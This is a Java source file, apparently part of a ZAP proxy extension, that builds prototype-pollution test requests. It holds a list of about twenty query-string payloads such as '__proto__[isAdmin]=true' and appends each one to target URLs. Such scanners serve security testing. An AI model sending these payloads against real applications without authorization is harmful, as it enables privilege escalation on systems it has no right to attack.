package org.zaproxy.zap.extension.hacktor.technique;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import java.util.List;
import java.util.function.BiConsumer;

public class PrototypePollutionTechniqueBuilder extends AbstractTechniqueBuilder {
    @Override public String getFamily() { return "Prototype Pollution"; }
    @Override public int getOrder() { return 35; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {
        String[] protoKeys = {
            "__proto__[isAdmin]=true","constructor.prototype.admin=true",
            "constructor[prototype][role]=admin","__proto__.role=admin",
            "__proto__[admin]=1","__proto__[role]=admin",
            "__proto__[__admin__]=true","__proto__[access]=admin",
            "__proto__[user]=admin","__proto__[permission]=admin",
            "constructor[admin]=true","constructor[role]=admin",
            "__proto__.admin=true","__proto__[is_admin]=true",
            "__proto__[__proto__][admin]=true",
            "toString[isAdmin]=true","valueOf[role]=admin",
            "__proto__[features][admin]=true",
            "__proto__[settings][admin]=true",
            "__proto__[config][admin]=true"
        };
        for (String pp : protoKeys) {
            final String p = pp;
            techs.add(new Technique("Prototype Pollution", "ProtoQ:" + pp,
                "Prototype pollution / mass-assignment key: " + pp,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    String q = ctx.origQuery.isEmpty() ? "?" : ctx.origQuery + "&";
                    replacePath(c, ctx.baseClean + q + p);
                    return c; }));
        }
    }
}
